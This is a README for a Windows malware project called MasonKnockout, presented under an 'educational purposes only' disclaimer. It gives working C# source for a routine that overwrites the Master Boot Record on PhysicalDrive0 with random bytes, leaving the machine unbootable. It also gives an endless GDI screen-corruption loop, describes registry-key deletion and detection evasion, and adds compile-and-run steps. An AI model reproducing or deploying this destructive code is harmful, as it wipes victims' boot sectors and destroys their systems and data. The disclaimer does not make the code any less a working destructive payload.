# MasonKnockout

## **Disclaimer** ⚠️
**This project is strictly for educational and research purposes only. Any misuse of this software may lead to serious legal consequences. The developers and contributors of this project are not responsible for any damage, harm, or illegal activities caused by the use of this software. Use it responsibly and at your own risk.**

---

## **GDI Effects Showcase** 🖼️
Here are some visual examples of the graphical effects produced by MasonKnockout:

1. **Screen Distortion** 🌪️  
   ![Screen Distortion](https://i.ibb.co/TDvXVryz/image.png)

2. **Color Inversion** 🔄  
   ![Color Inversion](https://i.ibb.co/0zggn5W/image.png)

3. **Random Scribbles** 🖍️  
   ![Random Scribbles](https://i.ibb.co/rGV2RRxW/image.png)

4. **Screen Melting** 🫠  
   ![Screen Melting](https://i.ibb.co/DHvpzm2c/image.png)

5. **Chaotic Patterns** 🌀  
   ![Chaotic Patterns](https://i.ibb.co/BHdbRjwL/image.png)

---

## **Project Overview** 🌐
**MasonKnockout** is an advanced and stealthy cyber tool designed to demonstrate various techniques related to system manipulation, graphical effects, and audio generation. It is a proof-of-concept project that showcases how certain system-level operations can be performed programmatically. The project is written in C# and utilizes Windows API calls to achieve its effects.

---

## **Key Features** 🔑
1. **Graphical Effects** 🎨:
   - Manipulates the screen with various graphical glitches, distortions, and animations.
   - Uses Windows GDI (Graphics Device Interface) to create real-time visual effects.
   - Includes effects like screen melting, color inversion, random scribbles, and more.

2. **Audio Generation** 🔊:
   - Generates audio using mathematical formulas (ByteBeat) and plays it in a loop.
   - Creates unique sound patterns by manipulating raw audio data.

3. **System Manipulation** 💻:
   - Overwrites the Master Boot Record (MBR) with random data, rendering the system unbootable.
   - Deletes registry keys, potentially causing system instability.

4. **Multi-threaded Execution** 🧵:
   - Runs multiple threads simultaneously to create a chaotic and unpredictable environment.
   - Each thread performs a different set of operations, ensuring a wide range of effects.

5. **Stealthy Execution** 🕵️:
   - Utilizes low-level Windows API calls to avoid detection by standard monitoring tools.
   - Operates in the background with minimal user interaction.

---

## **Code Explanation** 📜

### **1. Random Number Generator** 🎲
The `RandomGenerator` function generates pseudo-random numbers using bitwise operations. It is used to create unpredictable patterns for graphical and audio effects.

```csharp
private static ulong seed1, seed2;
private static int RandomGenerator()
{
    seed1 = seed2;
    seed1 ^= 0x5a8279995a827999;
    seed1 ^= (seed1 << 7) | (seed1 >> 25);
    seed1 *= 0x9e3779b99e3779b9;
    seed2 = seed1;
    return (int)(seed1 & 0x7fffffff);
}
```

---

### **2. Graphical Effects** 🎨
The project includes several graphical effects, each implemented in a separate method. These effects manipulate the screen using Windows GDI functions like `BitBlt`, `StretchBlt`, and `TransparentBlt`.

#### **Example: MasonFarewell** 👋
This method displays a message ("STICK YOUR COMPUTER IN THE TRASH") in random locations on the screen while applying various graphical distortions.

```csharp
    public static void MasonFarewell()
    {
        int sw = GetSystemMetrics(SM_CXSCREEN);
        int sh = GetSystemMetrics(SM_CYSCREEN);
        IntPtr desk = GetDC(IntPtr.Zero);
        IntPtr desktopWindow = GetDesktopWindow();
        IntPtr hdcScreen = GetDC(IntPtr.Zero);
        Random random = new Random();
        int n = 10;
        Graphics graphics = Graphics.FromHdc(desk);
        graphics.TextRenderingHint = TextRenderingHint.AntiAliasGridFit;
        Font font = new Font("Impact", 70, FontStyle.Bold, GraphicsUnit.Point);
        string text = "STICK YOUR COMPUTER IN THE TRASH";
        while (true)
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            IntPtr hDc = GetWindowDC(desktopWindow);
            BitBlt(hdc, random.Next(sw), random.Next(sh), random.Next(sw), random.Next(sh), hdc, random.Next(sw), random.Next(sh), SRCCOPY);
            BitBlt(hdc, 10, random.Next(sh), sw, 96, hdc, 0, random.Next(sh), CUSTOM_ROP);
            BitBlt(hdc, -10, random.Next(sh), sw, -96, hdc, 0, random.Next(sh), CUSTOM_ROP);
            BitBlt(hdc, random.Next(-1380, 451), random.Next(sh), sw, 600, hdc, 200, random.Next(sh), SRCCOPY);
            BitBlt(hdc, random.Next(sw), random.Next(-1560, 291), 600, sh, hdc, random.Next(sw), 200, SRCCOPY);
            BitBlt(hdc, -2, -2, sw, sh, hdc, 1, 1, SRCCOPY);
            uint color = (uint)(random.Next(256) << 16 | random.Next(256) << 8 | random.Next(256));
            IntPtr brush = CreateSolidBrush(color);
            SelectObject(hdc, brush);
            PatBlt(hdc, 0, 0, sw, sh, (int)PATINVERT);
            DeleteObject(brush);
            StretchBlt(hdcScreen, n, n, sw - n * 2, sh - n * 2, hdcScreen, 0, 0, sw, sh, SRCCOPY);
            SetStretchBltMode(hdcScreen, HALFTONE);
            StretchBlt(hdcScreen, 0, 0, sw + 1, sh - 1, hdcScreen, 0, 0, sw, sh, SRCCOPY);
            StretchBlt(hdcScreen, 0, 0, sw - 1, sh + 1, hdcScreen, 0, 0, sw, sh, SRCCOPY);
            float x = random.Next(sw - 400);
            float y = random.Next(sh - 100);
            Brush textBrush = new SolidBrush(Color.FromArgb(random.Next(256), random.Next(256), random.Next(256)));
            graphics.DrawString(text, font, textBrush, x, y);
            DrawIcon(hDc, random.Next(sw), random.Next(sh), LoadIcon(IntPtr.Zero, IDI_ERROR));
            DrawIcon(hDc, random.Next(sw), random.Next(sh), LoadIcon(IntPtr.Zero, IDI_WARNING));
            DrawIcon(hDc, random.Next(sw), random.Next(sh), LoadIcon(IntPtr.Zero, IDI_APPLICATION));
            Pen pen = new Pen(Color.FromArgb(random.Next(256), random.Next(256), random.Next(256)), random.Next(1, 10));
            graphics.DrawLine(pen, random.Next(sw), random.Next(sh), random.Next(sw), random.Next(sh));
            graphics.DrawEllipse(pen, random.Next(sw), random.Next(sh), random.Next(100, 300), random.Next(100, 300));
            graphics.DrawRectangle(pen, random.Next(sw), random.Next(sh), random.Next(100, 300), random.Next(100, 300));
            int rop = random.Next(2) == 0 ? SRCAND : SRCPAINT;
            BitBlt(hdcScreen, random.Next(2), random.Next(2), sw, sh, hdcScreen, random.Next(2), random.Next(2), rop);
            if (n < sw) n += 12;
            if (n > sw) n = 4;
        }
    }
```

---

### **3. Audio Generation** 🔊
The `MasonByteBeat` method generates audio using mathematical formulas. It creates a buffer of raw audio data and plays it in a loop using the `SoundPlayer` class.

```csharp
public static void MasonByteBeat()
{
    foreach (var formula in Formulas)
    {
        byte[] buffer = MasonGenerateBuffer(formula);
        MasonPlayBufferLoop(buffer);
    }
}
```

---

### **4. System Manipulation** 💻
The `MasonMBR` method overwrites the Master Boot Record (MBR) with random data, rendering the system unbootable. This is a destructive operation and should only be used in controlled environments.

```csharp
private static void MasonMBR()
{
    using (FileStream fs = new FileStream(@"\\.\PhysicalDrive0", FileMode.Open, FileAccess.Write))
    {
        byte[] mbrData = new byte[FreemasonryMBR];
        Random rand = new Random();
        rand.NextBytes(mbrData);
        fs.Write(mbrData, 0, FreemasonryMBR);
    }
}
```

---

### **5. Multi-threaded Execution** 🧵
The `MasonGDI` method runs multiple threads simultaneously, each performing a different graphical effect. This creates a chaotic and unpredictable environment.

```csharp
    static void MasonGDI()
    {
        while (true)
        {
            Mason1Thread = new Thread(MasonFarewell);
            Mason1Thread.IsBackground = true;
            Mason1Thread.Start();
            Thread.Sleep(10000);
            MasonClear();
            Mason2Thread = new Thread(MasonRandomly);
            Mason2Thread.IsBackground = true;
            Mason2Thread.Start();
            Thread.Sleep(10000);
            MasonClear();
            Mason3Thread = new Thread(MasonRepetition);
            Mason3Thread.IsBackground = true;
            Mason3Thread.Start();
            Thread.Sleep(10000);
            MasonClear();
            Mason4Thread = new Thread(MasonScribble);
            Mason4Thread.IsBackground = true;
            Mason4Thread.Start();
            Thread.Sleep(10000);
            MasonClear();
            Mason5Thread = new Thread(MasonGetdown);
            Mason5Thread.IsBackground = true;
            Mason5Thread.Start();
            Thread.Sleep(10000);
            MasonClear();
            Mason6Thread = new Thread(MasonGlitch);
            Mason6Thread.IsBackground = true;
            Mason6Thread.Start();
            Thread.Sleep(10000);
            MasonClear();
            Mason7Thread = new Thread(MasonMelting);
            Mason7Thread.IsBackground = true;
            Mason7Thread.Start();
            Thread.Sleep(10000);
            MasonClear();
            Mason8Thread = new Thread(MasonConfusion);
            Mason8Thread.IsBackground = true;
            Mason8Thread.Start();
            Thread.Sleep(10000);
            MasonClear();
            Mason9Thread = new Thread(MasonColors);
            Mason9Thread.IsBackground = true;
            Mason9Thread.Start();
            Thread.Sleep(10000);
            MasonClear();
            Mason10Thread = new Thread(MasonMess);
            Mason10Thread.IsBackground = true;
            Mason10Thread.Start();
            Thread.Sleep(10000);
            MasonClear();
        }
    }
```

---

## **How to Use** 🛠️
1. **Compile the Code**:
   - Use a C# compiler (e.g., Visual Studio) to compile the project.
   - Ensure that the project targets the .NET Framework.

2. **Run the Executable**:
   - Execute the compiled binary in a controlled environment (e.g., a virtual machine).
   - Observe the graphical and audio effects.

3. **Terminate the Program**:
   - Use Task Manager or a similar tool to stop the program if necessary.

---

## **Warnings** ⚠️
- **Destructive Operations**: This software includes destructive operations like overwriting the MBR and deleting registry keys. These operations can render a system unbootable or unstable.
- **Legal Consequences**: Misuse of this software may lead to legal consequences. Always use it in a controlled and authorized environment.
- **No Warranty**: This software is provided "as-is" without any warranties. The developers are not responsible for any damage caused by its use.

---

## **Conclusion** 🎯
**MasonKnockout** is a powerful demonstration of system-level programming and graphical manipulation. It serves as an educational tool to understand the potential risks and capabilities of low-level system access. Always use this software responsibly and in compliance with applicable laws and regulations.

---

Developed By: **ABOLHB**  
Group: **FREEMASONRY** 📚
